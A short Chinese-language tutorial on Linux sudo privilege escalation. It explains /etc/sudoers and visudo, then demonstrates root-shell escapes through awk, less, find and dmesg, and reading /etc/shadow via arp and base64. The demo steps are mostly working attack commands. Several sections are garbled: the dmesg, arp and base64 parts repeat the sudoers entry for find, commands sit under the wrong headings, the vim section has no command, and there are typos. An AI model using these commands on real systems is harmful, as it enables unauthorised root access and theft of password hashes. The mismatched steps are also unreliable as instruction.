Linux提权之sudo提权

sudo执行过程

  • 当用户执行sudo时，系统会主动寻找/etc/sudoers文件，判断该用户是否具有sudo权限
  • 如果用户具有sudo权限之后，让用户输入用户自己的密码确认
  • root执行sudo是不需要输入密码(eudoers文件中有配置root ALL=(ALL) ALL)
  • sudo能够限制用户只在某台主机上运行某些命令
  • sudo的配置文件是/etc/sudoers，属性必须为0440，它允许系统管理员集中的管理用户的使用权限和使用的主机

编辑配置文件命令：visudo

编辑sudo的配置文件/etc/sudoers一般不会直接使用vi编辑，因为sudoers配置有一定的语法，直接使用vi编辑保存系统不会检查语法，如果配置错了会导致无法使用sudo工具，使用visudo配置保存是会进行语法检查，如果配置错误会有提示

sudo提权演示

awk提权

visudo 编辑配置文件，在文件中加入

playzg ALL=/usr/bin/awk

sudo awk 'BEGIN {system("/bin/bash")}'

less提权

visudo 编辑配置文件，在文件中加入

playzg ALL=/usr/bin/less

!/bin/bash

vim提权

visudo 编辑配置文件，在文件中加入

playzg ALL=/usr/bin/vim

find提权

visudo 编辑配置文件，在文件中加入

playzg ALL=/usr/bin/find

dmesg提权

visudo 编辑配置文件，在文件中加入

playzg ALL=/usr/bin/find

sudo find /usr/bin -name ls -exec /bin/bash \;

sudo demsg -H，然后输入!/bin/bash

arp提权

visudo 编辑配置文件，在文件中加入

playzg ALL=/usr/bin/find

sudo arp -v -f /etc/shadow

读取到了/etc/shadow

base64提权

visudo 编辑配置文件，在文件中加入

playzg ALL=/usr/bin/find

sudo base64 "/etc/shadow" | base64 --decode
